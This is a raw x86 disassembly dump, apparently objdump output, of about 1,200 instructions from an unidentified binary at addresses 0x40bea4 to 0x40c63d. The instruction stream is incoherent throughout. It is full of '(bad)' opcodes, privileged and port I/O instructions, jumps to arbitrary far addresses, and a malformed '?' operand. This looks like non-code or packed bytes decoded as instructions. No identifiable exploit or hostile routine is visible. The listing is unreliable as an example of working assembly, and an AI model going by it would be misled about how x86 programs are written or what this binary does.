  40bea4:	lds    ebx,FWORD PTR [ebp-0x2f]
  40bea7:	fwait
  40bea8:	(bad)  
  40bea9:	es adc al,0x60
  40beac:	ret    0x5405
  40beaf:	aaa    
  40beb0:	leave  
  40beb1:	xor    DWORD PTR [ecx+0x2eb88da2],edx
  40beb7:	jb     0x40be7a
  40beb9:	fstp   DWORD PTR [edx-0x49]
  40bebc:	mov    edx,0x9ad5505e
  40bec1:	xor    al,0x3a
  40bec3:	aas    
  40bec4:	mov    esp,0xc39015cd
  40bec9:	jl     0x40be62
  40becb:	pmuludq mm7,QWORD PTR [edx+ebx*1-0x3c]
  40bed0:	push   cs
  40bed1:	jo     0x40bf51
  40bed3:	fs in  eax,0xc3
  40bed6:	test   BYTE PTR [ebx+ebx*2-0x794cbcbd],dl
  40bedd:	sub    BYTE PTR [eax-0xeef3447],0xe
  40bee4:	jmp    0x40bf13
  40bee6:	lods   al,BYTE PTR ds:[esi]
  40bee7:	ins    BYTE PTR es:[edi],dx
  40bee8:	nop
  40bee9:	fwait
  40beea:	jecxz  0x40bf21
  40beec:	ds das 
  40beee:	repz sub edx,ecx
  40bef1:	jns    0x40bec5
  40bef3:	xchg   DWORD PTR [ebx-0x238c6fea],edx
  40bef9:	stos   DWORD PTR es:[edi],eax
  40befa:	ss pop esi
  40befc:	aas    
  40befd:	cmp    ebp,esi
  40beff:	mov    ebp,0x1e5c500b
  40bf04:	inc    ebp
  40bf05:	test   DWORD PTR [ebx+0x7c],edx
  40bf08:	test   al,0x5d
  40bf0a:	lahf   
  40bf0b:	xor    al,0x44
  40bf0d:	jne    0x40bf6c
  40bf0f:	fmul   QWORD PTR [esi]
  40bf11:	fiadd  DWORD PTR [edi]
  40bf13:	ds push 0xf58abc8d
  40bf19:	cmc    
  40bf1a:	adc    al,BYTE PTR [edx+0x6fb306ae]
  40bf20:	(bad)  
  40bf21:	dec    edi
  40bf22:	(bad)  [ebp-0xb]
  40bf25:	and    ch,cl
  40bf27:	aad    0x8b
  40bf29:	push   eax
  40bf2a:	ret    0x14e2
  40bf2d:	jg     0x40bef2
  40bf2f:	xchg   esi,eax
  40bf30:	sub    al,0x1e
  40bf32:	das    
  40bf33:	xor    al,0x67
  40bf35:	pop    ebp
  40bf36:	not    DWORD PTR [eax]
  40bf38:	mov    bh,0x78
  40bf3a:	ficom  DWORD PTR [edx-0x106427d2]
  40bf40:	sahf   
  40bf41:	push   0xfffffff1
  40bf43:	xchg   ebx,eax
  40bf44:	ds or  eax,0xd7881ef6
  40bf4a:	adc    al,0x70
  40bf4c:	sar    DWORD PTR [esi-0x548b5f57],0x8a
  40bf53:	cwde   
  40bf54:	imul   edx,DWORD PTR [ecx+0x2c],0xe07ce9bd
  40bf5b:	jo     0x40bf52
  40bf5d:	jle    0x40bf38
  40bf5f:	pusha  
  40bf60:	sub    eax,0xfd08ee6c
  40bf65:	int    0xa4
  40bf67:	or     BYTE PTR fs:[edx-0x5caf0027],bh
  40bf6e:	mov    ah,0x25
  40bf70:	cld    
  40bf71:	adc    al,0x20
  40bf73:	xor    eax,0xa715cde3
  40bf78:	int3   
  40bf79:	xor    eax,0x4728019d
  40bf7e:	test   DWORD PTR [eax+0x7f8fa440],ebx
  40bf84:	push   ecx
  40bf85:	fcmovb st,st(6)
  40bf87:	into   
  40bf88:	and    BYTE PTR [esi],dl
  40bf8a:	test   BYTE PTR [eax+edx*1-0x4d],bl
  40bf8e:	fnstsw WORD PTR [ebx-0x36059407]
  40bf94:	xchg   edi,eax
  40bf95:	and    bl,BYTE PTR [edi+ecx*4]
  40bf98:	inc    edx
  40bf99:	das    
  40bf9a:	sti    
  40bf9b:	push   ebx
  40bf9c:	and    ebx,ebx
  40bf9e:	cmc    
  40bf9f:	pop    ebx
  40bfa0:	mov    esp,0x4fde4437
  40bfa5:	xor    dl,dl
  40bfa7:	shl    DWORD PTR [esi+0x7e],0xe7
  40bfab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfac:	retf   
  40bfad:	dec    esi
  40bfae:	(bad)  
  40bfaf:	adc    bl,al
  40bfb1:	rol    DWORD PTR [edx-0x63dad50],1
  40bfb7:	push   esi
  40bfb8:	arpl   WORD PTR [ecx+esi*2],ax
  40bfbb:	cdq    
  40bfbc:	jle    0x40bf69
  40bfbe:	xor    ah,ch
  40bfc0:	sub    al,0xd8
  40bfc2:	out    dx,al
  40bfc3:	je     0x40bf45
  40bfc5:	cs mov bh,0x26
  40bfc8:	xor    BYTE PTR [esi+0x35962b68],ah
  40bfce:	xor    al,0xf6
  40bfd0:	fwait
  40bfd1:	xchg   ecx,eax
  40bfd2:	call   FWORD PTR [esi]
  40bfd4:	xor    DWORD PTR [ecx-0x51eb1508],esp
  40bfda:	push   edi
  40bfdb:	xor    eax,edx
  40bfdd:	cdq    
  40bfde:	adc    BYTE PTR [ecx],bl
  40bfe0:	push   ebp
  40bfe1:	mov    ah,0x1b
  40bfe3:	cs scas al,BYTE PTR es:[edi]
  40bfe5:	and    dl,0x2d
  40bfe8:	and    dh,BYTE PTR [edx+edx*1]
  40bfeb:	mov    bl,BYTE PTR ds:0xc3aca3b2
  40bff1:	(bad)  
  40bff2:	in     eax,0x9f
  40bff4:	push   ebp
  40bff5:	test   eax,0xf81f69e2
  40bffa:	mov    DWORD PTR [eax],ecx
  40bffc:	jmp    0xd5dde3fc
  40c001:	sbb    dh,BYTE PTR [edx]
  40c003:	push   ds
  40c004:	lods   al,BYTE PTR ds:[esi]
  40c005:	fidiv  WORD PTR [ecx+eax*1]
  40c008:	into   
  40c009:	js     0x40bfee
  40c00b:	lds    ebx,FWORD PTR [ecx+0x26]
  40c00e:	in     al,dx
  40c00f:	jmp    0x40c05a
  40c011:	jge    0x40bfa1
  40c013:	jae    0x40bfef
  40c015:	push   ebp
  40c016:	mov    cl,0x1a
  40c018:	mov    ah,0x77
  40c01a:	add    esi,edx
  40c01c:	jmp    0xafcb:0x5d685d28
  40c023:	fwait
  40c024:	std    
  40c025:	call   0xd73fd5e8
  40c02a:	leave  
  40c02b:	pusha  
  40c02c:	out    dx,eax
  40c02d:	sub    al,0x4e
  40c02f:	outs   dx,BYTE PTR ds:[esi]
  40c030:	mov    ecx,0xcce7910e
  40c035:	push   ebx
  40c036:	add    eax,0xb73bc9f4
  40c03b:	mov    cl,0xe
  40c03d:	ror    BYTE PTR [ecx+0x52],0x21
  40c041:	mov    ebx,0x8007fe1a
  40c046:	in     eax,0x7f
  40c048:	cmc    
  40c049:	das    
  40c04a:	cmp    eax,0xbdf96258
  40c04f:	sti    
  40c050:	jae    0x40bfe7
  40c052:	ss sar esi,cl
  40c055:	dec    edx
  40c056:	xchg   bx,ax
  40c058:	inc    esi
  40c059:	fnstenv [eax+0x6b]
  40c05c:	and    esi,DWORD PTR [edi-0x64]
  40c05f:	cli    
  40c060:	mov    dl,0xb4
  40c062:	dec    ecx
  40c063:	mov    esp,0xe0e46846
  40c068:	js     0x40c06e
  40c06a:	(bad)  
  40c06b:	dec    ebx
  40c06c:	sub    al,0x63
  40c06e:	and    edx,DWORD PTR [ebp+0x7e1193ae]
  40c074:	xlat   BYTE PTR ds:[ebx]
  40c075:	sti    
  40c076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c077:	and    dh,BYTE PTR [ecx+0x3f]
  40c07a:	xchg   edx,eax
  40c07b:	jno    0x40c0eb
  40c07d:	aaa    
  40c07e:	cwde   
  40c07f:	mov    esi,0x331e0f85
  40c084:	add    DWORD PTR [ecx-0x35],ecx
  40c087:	mov    bl,0x21
  40c089:	(bad)  
  40c08a:	loope  0x40c029
  40c08c:	mov    eax,ds:0xb9609357
  40c091:	rcr    ecx,cl
  40c093:	or     BYTE PTR [ebx-0x24051ac3],bl
  40c099:	clc    
  40c09a:	cmc    
  40c09b:	mov    ds:0x385f3819,eax
  40c0a0:	and    eax,0xf2677d7e
  40c0a5:	nop
  40c0a6:	inc    bh
  40c0a8:	mov    ah,BYTE PTR [ebx+0x34]
  40c0ab:	sbb    BYTE PTR [ebx-0x3e364460],bh
  40c0b1:	sub    DWORD PTR [eax+0x2c],eax
  40c0b4:	mov    cl,0x44
  40c0b6:	mul    DWORD PTR [ecx+0x69]
  40c0b9:	(bad)  
  40c0ba:	fiadd  DWORD PTR [edx]
  40c0bc:	and    BYTE PTR [edx],bh
  40c0be:	cwde   
  40c0bf:	push   ss
  40c0c0:	sub    al,0x23
  40c0c2:	cmp    edx,ebx
  40c0c4:	mov    dl,BYTE PTR [edx+0x38]
  40c0c7:	mov    esp,0x92570d59
  40c0cc:	jbe    0x40c073
  40c0ce:	or     ecx,DWORD PTR [edx-0x6bea71ce]
  40c0d4:	mov    bh,0xa
  40c0d6:	fnstsw ax
  40c0d8:	iret   
  40c0d9:	adc    esp,esp
  40c0db:	jg     0x40c08f
  40c0dd:	stos   BYTE PTR es:[edi],al
  40c0de:	xchg   BYTE PTR [edi+0x47ad8614],cl
  40c0e4:	mov    ebx,0x343aa99
  40c0e9:	mov    ds:0xbea0d2,eax
  40c0ee:	pusha  
  40c0ef:	jl     0x40c14a
  40c0f1:	jl     0x40c0ec
  40c0f3:	ficom  DWORD PTR [ebp-0xc9ee9ed]
  40c0f9:	sub    edx,DWORD PTR [ebx-0x7de46b63]
  40c0ff:	(bad)  
  40c100:	jle    0x40c082
  40c102:	pop    edx
  40c103:	jno    0x40c101
  40c105:	adc    al,0x62
  40c107:	fwait
  40c108:	jg     0x40c134
  40c10a:	fnsave [eax+0x2c]
  40c10d:	and    eax,0xa27496e6
  40c112:	arpl   WORD PTR [ecx],bp
  40c114:	(bad)  
  40c115:	xchg   ebx,eax
  40c116:	shl    DWORD PTR [edx+esi*4+0x18b0fbc8],cl
  40c11d:	ficomp WORD PTR [ebx-0x41]
  40c120:	(bad)  
  40c121:	out    0x96,al
  40c123:	ficom  WORD PTR [esi-0x38c95622]
  40c129:	mov    eax,ds:0x62056a2e
  40c12e:	scas   eax,DWORD PTR es:[edi]
  40c12f:	sbb    eax,0xbfd375d9
  40c134:	add    DWORD PTR [edi+0x74adb507],esp
  40c13a:	mov    ah,0x68
  40c13c:	xor    DWORD PTR [esi-0x3b6e255],ebp
  40c142:	cdq    
  40c143:	mov    ebx,es
  40c145:	enter  0x29dc,0x64
  40c149:	je     0x40c19a
  40c14b:	fdiv   DWORD PTR [edx]
  40c14d:	shl    BYTE PTR [edx-0x32111bfd],0xe2
  40c154:	(bad)  
  40c155:	cld    
  40c156:	fisub  WORD PTR [edx]
  40c158:	popa   
  40c159:	arpl   WORD PTR ds:[edi-0x386d5201],ax
  40c160:	dec    esi
  40c161:	(bad)  
  40c162:	jp     0x40c172
  40c164:	loop   0x40c16d
  40c166:	push   ebx
  40c167:	sub    ebp,DWORD PTR [eax]
  40c169:	call   0x7085a2d
  40c16e:	sub    al,0x85
  40c170:	add    DWORD PTR [edx],esp
  40c172:	dec    ebp
  40c173:	xchg   ebp,eax
  40c174:	(bad)  
  40c175:	xor    al,0x4e
  40c177:	push   ebx
  40c178:	xchg   esi,eax
  40c179:	and    dh,BYTE PTR [eax+0x62]
  40c17c:	or     al,BYTE PTR [ecx+0x45]
  40c17f:	loope  0x40c12d
  40c181:	fmul   QWORD PTR [esi]
  40c183:	pop    edi
  40c184:	in     al,0xa0
  40c186:	jl     0x40c1c0
  40c188:	pop    ds
  40c189:	pop    es
  40c18a:	frstor [ebp-0x76]
  40c18d:	ins    DWORD PTR es:[edi],dx
  40c18e:	or     cl,BYTE PTR [edx]
  40c190:	mov    dl,0xc2
  40c192:	icebp  
  40c193:	fimul  DWORD PTR [ecx]
  40c195:	push   edx
  40c196:	or     DWORD PTR [esi+eiz*2],edi
  40c199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c19a:	int3   
  40c19b:	nop
  40c19c:	jnp    0x40c1e2
  40c19e:	ja     0x40c1df
  40c1a0:	pop    ds
  40c1a1:	inc    edi
  40c1a2:	dec    ebx
  40c1a3:	jne    0x40c13e
  40c1a5:	mov    ds:0x7fcc38e,al
  40c1aa:	out    dx,al
  40c1ab:	jle    0x40c142
  40c1ad:	lds    ebp,FWORD PTR [esi-0x6b]
  40c1b0:	pop    ecx
  40c1b1:	aad    0x9c
  40c1b3:	pop    ds
  40c1b4:	xchg   ecx,eax
  40c1b5:	jmp    0xc5fc856b
  40c1ba:	std    
  40c1bb:	cmp    eax,0x837284b6
  40c1c0:	sub    bl,BYTE PTR ds:0x646e28c1
  40c1c6:	jnp    0x40c241
  40c1c8:	call   0xc7194b79
  40c1cd:	into   
  40c1ce:	out    0xd9,al
  40c1d0:	xor    ebx,DWORD PTR [eax]
  40c1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d3:	dec    eax
  40c1d4:	lods   al,BYTE PTR ds:[esi]
  40c1d5:	xchg   edx,eax
  40c1d6:	int3   
  40c1d7:	add    eax,0x23e744e3
  40c1dc:	jmp    0x40c25d
  40c1de:	jno    0x40c23f
  40c1e0:	in     al,dx
  40c1e1:	sbb    al,0xf5
  40c1e3:	sbb    BYTE PTR [esi+0x6e7598fc],ah
  40c1e9:	jge    0x40c1f0
  40c1eb:	aad    0xe1
  40c1ed:	jmp    0x77c9d925
  40c1f2:	nop
  40c1f3:	das    
  40c1f4:	ret    0x471d
  40c1f7:	pop    esp
  40c1f8:	adc    edx,DWORD PTR [ebx-0x3d]
  40c1fb:	sbb    al,0x72
  40c1fd:	mov    ebx,0x4e0b2173
  40c202:	fsub   DWORD PTR [ebx]
  40c204:	push   edi
  40c205:	out    0x8b,eax
  40c207:	rol    BYTE PTR [edi-0x766181df],0xbb
  40c20e:	pop    edi
  40c20f:	ja     0x40c254
  40c211:	imul   ebx,DWORD PTR [eax+0x22],0x7c5a44c1
  40c218:	cmp    DWORD PTR [ecx],esi
  40c21a:	mul    DWORD PTR [esi-0x636b361f]
  40c220:	aam    0x65
  40c222:	jmp    0xd6bc09c9
  40c227:	mov    esi,0x758ac99
  40c22c:	push   ebx
  40c22d:	in     eax,0x74
  40c22f:	call   FWORD PTR [esi-0x1e453cda]
  40c235:	fistp  WORD PTR [ecx-0x16]
  40c238:	push   eax
  40c239:	call   0xdd4f879e
  40c23e:	leave  
  40c23f:	adc    BYTE PTR [eax+0x6fd71648],cl
  40c245:	push   es
  40c246:	sbb    ecx,DWORD PTR [eax+0x57c00f9e]
  40c24c:	retf   
  40c24d:	push   0x3fa85e46
  40c252:	lahf   
  40c253:	(bad)  
  40c254:	jg     0x40c1f9
  40c256:	xor    ah,BYTE PTR [esi-0x29]
  40c259:	pop    eax
  40c25a:	mov    ebx,0x4f0b5b8d
  40c260:	push   ebp
  40c261:	scas   al,BYTE PTR es:[edi]
  40c262:	fsubr  DWORD PTR [ebp-0x442b094b]
  40c268:	xor    BYTE PTR [ecx],0x65
  40c26b:	les    ebx,FWORD PTR [ebx+0x47118734]
  40c271:	push   0x92be883f
  40c276:	mov    eax,0xce713f94
  40c27b:	ret    
  40c27c:	pop    ss
  40c27d:	pop    ecx
  40c27e:	into   
  40c27f:	add    ebx,DWORD PTR [edi+eiz*8]
  40c282:	mov    cl,0x58
  40c284:	ja     0x40c21e
  40c286:	out    dx,al
  40c287:	imul   eax,DWORD PTR [edi],0xffffff96
  40c28a:	adc    al,0xcd
  40c28c:	daa    
  40c28d:	leave  
  40c28e:	daa    
  40c28f:	fcomp  QWORD PTR [edx+esi*4+0xa]
  40c293:	cmp    BYTE PTR [edi+edi*2],dh
  40c296:	repz sub cl,BYTE PTR [ebx-0x3b2af08d]
  40c29d:	shl    BYTE PTR [ecx+0xf],0x78
  40c2a1:	cmp    bh,BYTE PTR [eax-0x38]
  40c2a4:	arpl   WORD PTR [ecx-0x7ef8139d],bp
  40c2aa:	test   eax,0x8faa7723
  40c2af:	xor    eax,0xd7bc1e0c
  40c2b4:	dec    esp
  40c2b5:	mov    cl,BYTE PTR [esi-0x2d]
  40c2b8:	ss inc eax
  40c2ba:	and    ebp,eax
  40c2bc:	cmp    ah,al
  40c2be:	add    ch,BYTE PTR [edi-0x10]
  40c2c1:	repnz mov dl,BYTE PTR [esi+0x100b87f1]
  40c2c8:	sub    DWORD PTR [ebp-0x40],ebp
  40c2cb:	xchg   ecx,eax
  40c2cc:	sbb    DWORD PTR [ebx+0x43],0xffffff98
  40c2d0:	cmp    al,0x19
  40c2d2:	fs xor ch,BYTE PTR gs:[eax]
  40c2d6:	cmp    BYTE PTR [eax+ecx*2],cl
  40c2d9:	pop    es
  40c2da:	iret   
  40c2db:	mov    ebp,esp
  40c2dd:	xor    dh,BYTE PTR ds:0x31b72154
  40c2e3:	push   edi
  40c2e4:	leave  
  40c2e5:	xchg   edx,eax
  40c2e6:	or     BYTE PTR [edi+0x59a206bc],ah
  40c2ec:	pop    ebx
  40c2ed:	sar    BYTE PTR [edx-0x5e],1
  40c2f0:	xchg   BYTE PTR [edx+0x55ead50],ch
  40c2f6:	mov    eax,DWORD PTR [ebx+0x5]
  40c2f9:	xchg   edi,eax
  40c2fa:	cmp    ah,BYTE PTR [esi-0x73]
  40c2fd:	pop    esp
  40c2fe:	in     eax,0x2d
  40c300:	(bad)  
  40c302:	sub    eax,0x6a45b77
  40c307:	xor    ecx,edx
  40c309:	push   ds
  40c30a:	call   0x2bfc:0xdefc772a
  40c311:	xchg   ebx,eax
  40c312:	pop    ebp
  40c313:	das    
  40c314:	or     eax,0xce222cf5
  40c319:	test   BYTE PTR [ebx],bl
  40c31b:	push   ebp
  40c31c:	lods   eax,DWORD PTR ds:[esi]
  40c31d:	mov    DWORD PTR ds:0x59094ee8,0xdce6684c
  40c327:	enter  0x523,0x1b
  40c32b:	les    ebx,FWORD PTR [ecx+0x6cf5b574]
  40c331:	sbb    ch,al
  40c333:	mov    eax,es:0xc2f643a4
  40c339:	add    eax,0xf2a51074
  40c33e:	icebp  
  40c33f:	jnp    0x40c3a5
  40c341:	aam    0x6b
  40c343:	push   ebx
  40c344:	push   eax
  40c345:	stos   BYTE PTR es:[edi],al
  40c346:	(bad)  
  40c347:	ja     0x40c370
  40c349:	shl    DWORD PTR [esi-0x35dd936c],1
  40c34f:	mov    ebx,0x1192e705
  40c354:	push   edx
  40c355:	loope  0x40c399
  40c357:	mov    dl,0x97
  40c359:	jnp    0x40c304
  40c35b:	cdq    
  40c35c:	push   eax
  40c35d:	jl     0x40c318
  40c35f:	pop    ds
  40c360:	(bad)  
  40c361:	jmp    0xec01d0b
  40c366:	jge    0x40c30e
  40c368:	add    eax,0x7009c6b1
  40c36d:	jne    0x40c39c
  40c36f:	adc    BYTE PTR [esi-0x36c3aea9],al
  40c375:	lds    esp,FWORD PTR [eax-0x4e]
  40c378:	(bad)  [ecx+0x3d485c0e]
  40c37e:	cdq    
  40c37f:	pop    esi
  40c380:	and    DWORD PTR [ebx-0x25],ecx
  40c383:	xor    dh,BYTE PTR [ecx+0x5b]
  40c386:	mov    esp,0x837c1513
  40c38b:	aas    
  40c38c:	cdq    
  40c38d:	adc    BYTE PTR [esi*2+0x2bc4724d],ah
  40c394:	push   esi
  40c395:	push   eax
  40c396:	(bad)  
  40c397:	es dec esp
  40c399:	dec    eax
  40c39a:	shl    BYTE PTR [esi+esi*4],0x2e
  40c39e:	test   BYTE PTR [edi],ah
  40c3a0:	int3   
  40c3a1:	dec    ebx
  40c3a2:	or     BYTE PTR [eax+ecx*2],dh
  40c3a5:	push   esp
  40c3a6:	and    BYTE PTR [ecx-0x52349044],dh
  40c3ac:	in     al,0xca
  40c3ae:	dec    ebx
  40c3af:	mov    eax,ecx
  40c3b1:	bound  ebx,QWORD PTR ds:0xfb02ee85
  40c3b7:	loope  0x40c3c7
  40c3b9:	mov    BYTE PTR ds:0x8f504eca,bh
  40c3bf:	std    
  40c3c0:	in     al,0xfb
  40c3c2:	mov    cl,0x3e
  40c3c4:	and    dh,BYTE PTR [edi]
  40c3c6:	inc    edi
  40c3c7:	or     DWORD PTR [esi+0x4413abec],ebx
  40c3cd:	shl    DWORD PTR [edi+0x62],cl
  40c3d0:	inc    eax
  40c3d1:	pop    ss
  40c3d2:	pop    ds
  40c3d3:	mov    BYTE PTR ds:0x3205cdbf,bh
  40c3d9:	add    BYTE PTR [edi+0x7d3f0144],dh
  40c3df:	neg    BYTE PTR [ebx+0x660cf697]
  40c3e5:	cmp    dl,dh
  40c3e7:	xchg   edx,eax
  40c3e8:	push   edi
  40c3e9:	and    dh,dl
  40c3eb:	pop    ebp
  40c3ec:	jmp    0x40c3ed
  40c3ee:	lods   al,BYTE PTR ds:[esi]
  40c3ef:	repz xlat BYTE PTR ds:[ebx]
  40c3f1:	push   edx
  40c3f2:	inc    ebp
  40c3f3:	in     al,dx
  40c3f4:	test   DWORD PTR [ebx+edi*1],ecx
  40c3f7:	(bad)  
  40c3f8:	xor    DWORD PTR ds:0x4dcec1b3,edi
  40c3fe:	test   BYTE PTR [esi-0x4e],bh
  40c401:	mov    eax,0x7fa2e54
  40c406:	enter  0xbf7,0x27
  40c40a:	stos   DWORD PTR es:[edi],eax
  40c40b:	push   edi
  40c40c:	cli    
  40c40d:	out    dx,eax
  40c40e:	imul   ebx,DWORD PTR [eax+0x26],0xfe262f70
  40c415:	cmc    
  40c416:	hlt    
  40c417:	stc    
  40c418:	mov    eax,ds:0xadb0ed24
  40c41d:	stc    
  40c41e:	out    dx,al
  40c41f:	dec    esp
  40c420:	dec    ebp
  40c421:	xor    eax,esi
  40c423:	pusha  
  40c424:	cli    
  40c425:	pop    esi
  40c426:	daa    
  40c427:	mov    edx,0x40d922f5
  40c42c:	xchg   esp,eax
  40c42d:	fsubp  st(4),st
  40c42f:	mov    ch,0x9a
  40c431:	add    al,0x8f
  40c433:	test   BYTE PTR ds:0x47e04bf3,0xd1
  40c43a:	mov    eax,ds:0x5536f594
  40c43f:	inc    ebx
  40c440:	aaa    
  40c441:	fsub   st,st(4)
  40c443:	jnp    0x40c4a8
  40c445:	neg    DWORD PTR [ecx+ebp*8+0x20cbae6]
  40c44c:	xchg   DWORD PTR gs:[edx-0x3f],esi
  40c450:	mul    BYTE PTR [eax-0x3]
  40c453:	jmp    0xc1353f9c
  40c458:	inc    DWORD PTR [edi+0x5]
  40c45b:	in     eax,0x4b
  40c45d:	inc    ecx
  40c45e:	(bad)  
  40c45f:	mov    ch,0x75
  40c461:	mov    WORD PTR [edi-0x23],?
  40c464:	and    esi,ecx
  40c466:	mov    eax,ds:0xe526fc48
  40c46b:	popf   
  40c46c:	pop    ebx
  40c46d:	sbb    DWORD PTR [ebp-0x325b9a55],esi
  40c473:	push   0xf5f99b06
  40c478:	and    al,0x33
  40c47a:	dec    ebx
  40c47b:	call   0x4846a229
  40c480:	jp     0x40c479
  40c482:	dec    edi
  40c483:	and    BYTE PTR [edi+0x17],bl
  40c486:	les    eax,FWORD PTR [edi]
  40c488:	out    dx,al
  40c489:	mov    edi,DWORD PTR [ecx]
  40c48b:	jp     0x40c43e
  40c48d:	pop    ecx
  40c48e:	int3   
  40c48f:	mov    eax,0x76159813
  40c494:	mov    ecx,0x2e59ed39
  40c499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c49a:	mov    esp,esp
  40c49c:	call   0xac9e1e08
  40c4a1:	scas   eax,DWORD PTR es:[edi]
  40c4a2:	dec    eax
  40c4a3:	sbb    eax,0xd80c9f7b
  40c4a8:	mov    ebx,0x4760d00c
  40c4ad:	scas   eax,DWORD PTR es:[edi]
  40c4ae:	inc    ecx
  40c4af:	xor    esp,DWORD PTR [edx+0x47]
  40c4b2:	sbb    BYTE PTR [ebx],dh
  40c4b4:	jg     0x40c4a0
  40c4b6:	into   
  40c4b7:	hlt    
  40c4b8:	sub    al,0xcb
  40c4ba:	xchg   ebp,eax
  40c4bb:	mov    ah,0xaf
  40c4bd:	adc    BYTE PTR [edx-0x9333105],0xe2
  40c4c4:	outs   dx,DWORD PTR ds:[esi]
  40c4c5:	push   ds
  40c4c6:	pop    ebp
  40c4c7:	xchg   edx,eax
  40c4c8:	add    DWORD PTR [ebp+edx*2+0x3b],eax
  40c4cc:	mov    ebp,edi
  40c4ce:	aaa    
  40c4cf:	shr    esp,0xf8
  40c4d2:	sub    BYTE PTR [edx+0x116e235],bl
  40c4d8:	and    esp,DWORD PTR [ebp+0x585bb083]
  40c4de:	outs   dx,DWORD PTR ds:[esi]
  40c4df:	and    DWORD PTR ss:[ebp-0x6cb68ec8],eax
  40c4e6:	es jp  0x40c490
  40c4e9:	ins    BYTE PTR es:[edi],dx
  40c4ea:	(bad)  
  40c4eb:	sub    al,0x87
  40c4ed:	es push 0xffffffc9
  40c4f0:	daa    
  40c4f1:	das    
  40c4f2:	add    al,0x7f
  40c4f4:	push   ss
  40c4f5:	xor    al,0x8a
  40c4f7:	jmp    0x40c572
  40c4f9:	push   0x76278168
  40c4fe:	fadd   st(3),st
  40c500:	call   0x5130:0x301f7669
  40c507:	jmp    0xefa0be9d
  40c50c:	std    
  40c50d:	push   ds
  40c50e:	xchg   edi,eax
  40c50f:	push   ss
  40c510:	pushw  0xd15c
  40c514:	in     al,0x59
  40c516:	and    dh,ah
  40c518:	ds pop ds
  40c51a:	sbb    edi,DWORD PTR [edi]
  40c51c:	sahf   
  40c51d:	dec    ecx
  40c51e:	lea    eax,[edx]
  40c520:	into   
  40c521:	pop    esi
  40c522:	pop    ecx
  40c523:	cmp    ah,al
  40c525:	int    0xff
  40c527:	jle    0x40c56f
  40c529:	jmp    0xc0e6fa39
  40c52e:	mov    bh,0xb9
  40c530:	add    ah,bh
  40c532:	pop    ecx
  40c533:	lds    eax,FWORD PTR [edx+0x33a58ab5]
  40c539:	ds leave 
  40c53b:	xlat   BYTE PTR ds:[ebx]
  40c53c:	ins    BYTE PTR es:[edi],dx
  40c53d:	add    cl,dl
  40c53f:	dec    ebx
  40c540:	xchg   ecx,eax
  40c541:	xchg   esp,eax
  40c542:	popf   
  40c543:	(bad)  
  40c544:	mov    dh,0xdf
  40c546:	test   DWORD PTR [eax],0x7b96bc10
  40c54c:	adc    dh,BYTE PTR [ebp+0x60]
  40c54f:	aas    
  40c550:	retf   
  40c551:	add    BYTE PTR [edx-0x31c35899],ah
  40c557:	jg     0x40c5b7
  40c559:	cwde   
  40c55a:	cmp    BYTE PTR [ecx+0x5cdd9822],cl
  40c560:	cmp    BYTE PTR [ecx-0x44],0x2b
  40c564:	loop   0x40c4f9
  40c566:	aaa    
  40c567:	mov    WORD PTR [esi-0x6a1a5d7b],ds
  40c56d:	clc    
  40c56e:	push   ebp
  40c56f:	test   dh,0xa0
  40c572:	out    0x7a,al
  40c574:	xchg   edi,eax
  40c575:	rol    BYTE PTR [eax],0xd5
  40c578:	mov    eax,ds:0x833d8de2
  40c57d:	pop    ecx
  40c57e:	jb     0x40c564
  40c580:	xchg   edx,eax
  40c581:	jg     0x40c51a
  40c583:	cmp    BYTE PTR [eax+0x2a],ch
  40c586:	sbb    eax,0x7da9d436
  40c58b:	dec    ebx
  40c58c:	aad    0xed
  40c58e:	mov    bh,0x9e
  40c590:	mov    ecx,DWORD PTR ds:0xfbf79c1d
  40c596:	mov    esp,0x114ef77d
  40c59b:	jg     0x40c5f1
  40c59d:	push   es
  40c59e:	mul    ebp
  40c5a0:	in     eax,0x83
  40c5a2:	js     0x40c52c
  40c5a4:	icebp  
  40c5a5:	mov    ah,0x6d
  40c5a7:	add    BYTE PTR [edx+ebx*1+0x12],0x41
  40c5ac:	pop    edx
  40c5ad:	imul   eax,eax,0x6fe457b0
  40c5b3:	mov    bh,0xa9
  40c5b5:	scas   eax,DWORD PTR es:[edi]
  40c5b6:	xor    BYTE PTR [edx-0x14cc13f9],cl
  40c5bc:	imul   DWORD PTR [eax-0x4a05d213]
  40c5c2:	iret   
  40c5c3:	inc    ebp
  40c5c4:	or     al,0x24
  40c5c6:	inc    edi
  40c5c7:	jb     0x40c583
  40c5c9:	xchg   esp,eax
  40c5ca:	push   ss
  40c5cb:	or     al,0xd3
  40c5cd:	push   ecx
  40c5ce:	adc    BYTE PTR [edi+0x3f431bd4],ah
  40c5d4:	fnstcw WORD PTR [edi+eax*2]
  40c5d7:	pop    ebx
  40c5d8:	inc    edi
  40c5d9:	int3   
  40c5da:	cmp    BYTE PTR [eax+edx*8+0x70],bh
  40c5de:	mov    dl,0x1d
  40c5e0:	mov    dh,0x44
  40c5e2:	sahf   
  40c5e3:	dec    edi
  40c5e4:	push   ebx
  40c5e5:	aaa    
  40c5e6:	dec    ebp
  40c5e7:	jnp    0x40c5b8
  40c5e9:	sub    DWORD PTR [edx+0x62],ebp
  40c5ec:	mov    fs,WORD PTR [edx+0x3c4c5034]
  40c5f2:	hlt    
  40c5f3:	mov    ecx,DWORD PTR ds:0x63fbd550
  40c5f9:	not    DWORD PTR [esi+0x6]
  40c5fc:	mov    edx,0x3f295618
  40c601:	or     BYTE PTR [eax+0x47],dl
  40c604:	mov    DWORD PTR [edx],ebp
  40c606:	sbb    ch,BYTE PTR [edx-0x5c]
  40c609:	push   esi
  40c60a:	xchg   edx,eax
  40c60b:	mov    WORD PTR [esi-0x3a],ss
  40c60e:	cli    
  40c60f:	adc    esp,esp
  40c611:	fsub   DWORD PTR [eax-0x12805c84]
  40c617:	xor    edi,DWORD PTR [edx-0x23]
  40c61a:	and    bh,bl
  40c61c:	ss jmp 0x7b7d12ac
  40c622:	xsaves ds:0x269e8b26
  40c629:	push   ss
  40c62a:	dec    esp
  40c62b:	mov    ds:0x9e216007,eax
  40c630:	push   ebp
  40c631:	dec    esi
  40c632:	mov    dh,0x4c
  40c634:	das    
  40c635:	bound  eax,QWORD PTR [edi]
  40c637:	fild   WORD PTR [ebp-0x59e8b50e]
  40c63d:	or     eax,0x96c3cabd
